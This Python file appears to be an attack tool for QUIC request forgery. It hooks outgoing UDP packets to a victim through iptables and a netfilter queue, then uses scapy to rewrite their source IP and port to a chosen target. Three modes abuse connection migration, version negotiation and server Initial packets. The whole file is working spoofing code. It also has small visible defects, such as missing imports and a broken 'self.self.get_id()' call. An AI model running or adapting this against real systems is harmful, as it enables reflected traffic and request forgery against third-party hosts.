import threading
from netfilterqueue import NetfilterQueue
from scapy.all import *
import time
import subprocess

SPOOFED_COUNT = 0

# Iptables Templates
iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"


def _async_raise(tid, exctype):
    '''Raises an exception in the threads with id tid'''
    if not inspect.isclass(exctype):
        raise TypeError("Only types can be raised (not instances)")
    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(ctypes.c_long(tid),
                                                     ctypes.py_object(exctype))
    if res == 0:
        raise ValueError("invalid thread id")
    elif res != 1:
        # "if it returns a number greater than one, you're in trouble,
        # and you should call it again with exc=NULL to revert the effect"
        ctypes.pythonapi.PyThreadState_SetAsyncExc(ctypes.c_long(tid), None)
        raise SystemError("PyThreadState_SetAsyncExc failed")


class NetfilterThread(threading.Thread):

    def __init__(self, args):
        super(NetfilterThread,self).__init__()
        self.args = args


    def spoof_packet(self, packet, ip, port=0):
    
        payload = IP(packet.get_payload())
        
        #Set spoofed source address
        old_ip = payload.src
        payload.src = ip

        old_port = payload.sport
        if port != 0:
            payload.sport = port

        # Recalculate checksums for IP and UDP
        del payload[IP].chksum
        del payload[UDP].chksum
        payload = payload.__class__(bytes(payload))
        packet.set_payload(bytes(payload))
        print("[*] {old_ip}:{old_port} -> {ip}:{port}".format(old_ip=old_ip, old_port=old_port, ip=ip, port=(port if port !=0 else old_port)))

        return packet


    def connection_migration_callback(self, packet, starttime=0, args=None):
        global SPOOFED_COUNT
        if args.limit != 0 and SPOOFED_COUNT >= args.limit:
            packet.drop()
            return

        if time.time()-starttime > args.start_time:
            packet = self.spoof_packet(packet, args.target_ip, args.target_port)
            if args.limit != 0:
                SPOOFED_COUNT += 1

        packet.accept()
    

    def version_negotiation_callback(self, packet, args=None):
        global SPOOFED_COUNT
        if args.limit != 0 and SPOOFED_COUNT >= args.limit:
            packet.drop()
            return

        packet = self.spoof_packet(packet, args.target_ip, args.target_port)
        if args.limit != 0:
            SPOOFED_COUNT += 1
    
        packet.accept()
    

    def server_initial_callback(self, packet, args=None):
        global SPOOFED_COUNT
        if args.limit != 0 and SPOOFED_COUNT >= args.limit:
            packet.drop()
            return
        #if SPOOFED_COUNT >= 1: 
        packet = self.spoof_packet(packet, args.target_ip, args.target_port)
        if args.limit != 0:
            SPOOFED_COUNT += 1

        packet.accept()


    def run(self):
        
        starttime = time.time()
        iptables_insert = iptables_tmpl.format(action="-I", victim_ip=self.args.victim_ip, victim_port=self.args.victim_port)
        print("[+] Inserting iptables rules.")
        print(iptables_insert)
        subprocess.run(iptables_insert.split())
    
        try:

            print("[+] Initializing Netfilter Queue")
            #Initializing netfilter queue
            q = NetfilterQueue()
            p = None
            if self.args.mode == 'cm':
                q.bind(1, lambda packet, starttime=starttime, args=self.args : self.connection_migration_callback(packet, starttime, args))
            elif self.args.mode == 'vn':
                q.bind(1, lambda packet, args=self.args : self.version_negotiation_callback(packet, args))
            elif self.args.mode == 'si':
                q.bind(1, lambda packet,args=self.args : self.server_initial_callback(packet, args))
            else:
                raise NotImplementedError("Mode not implemented")

            print("[+] Hooking into nfqueue")
            q.run()

        except Exception as e: 
            print(e)
            print("\n[+] Cleaning up")
            print("[-] Unbinding netfilter queue.")
            q.unbind() 
            print("[-] Deleting iptables rule(s).")
            iptables_delete = iptables_tmpl.format(action="-D", victim_ip=self.args.victim_ip, victim_port=self.args.victim_port)
            print(iptables_delete)
            subprocess.run(iptables_delete.split())

        
    def get_id(self):
        # returns id of the respective thread
        if hasattr(self, '_thread_id'):
            return self._thread_id
        for id, thread in threading._active.items():
            if thread is self:
                return id

  
    def stop(self, exctype):
        _async_raise( self.self.get_id(), exctype )
        

